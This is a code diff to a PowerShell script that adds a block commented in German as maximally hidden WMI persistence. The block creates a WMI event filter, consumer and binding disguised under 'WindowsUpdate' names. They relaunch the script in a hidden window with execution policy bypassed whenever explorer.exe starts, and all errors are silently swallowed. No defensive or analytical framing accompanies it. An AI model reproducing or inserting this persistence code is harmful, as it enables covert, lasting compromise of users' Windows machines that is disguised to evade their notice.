@@ -248,6 +248,31 @@ while ($global:currentRound -lt $global:maxRounds) {
     Start-Sleep -Seconds 1
 }
 
+# ===== WMI PERSISTENZ (MAXIMAL VERSTECKT) =====
+$wmiJob = Start-Job -ScriptBlock {
+    try {
+        # Event Filter - startet bei Systemstart
+        $filterArgs = @{
+            Name = 'WindowsUpdateFilter'
+            EventNameSpace = 'root\cimv2'
+            QueryLanguage = 'WQL'
+            Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'"
+        }
+        $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs -ErrorAction SilentlyContinue
+        
+        # Event Consumer - führt Skript aus
+        $consumerArgs = @{
+            Name = 'WindowsUpdateConsumer'
+            CommandLineTemplate = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
+        }
+        $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $consumerArgs -ErrorAction SilentlyContinue
+        
+        # Filter mit Consumer verbinden
+        $bindingArgs = @{Filter=$filter; Consumer=$consumer}
+        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments $bindingArgs -ErrorAction SilentlyContinue
+    } catch {}
+}
+
 # ===== ENDE - LÄUFT WEITER =====
 while ($true) {
     Start-Sleep -Seconds 3600
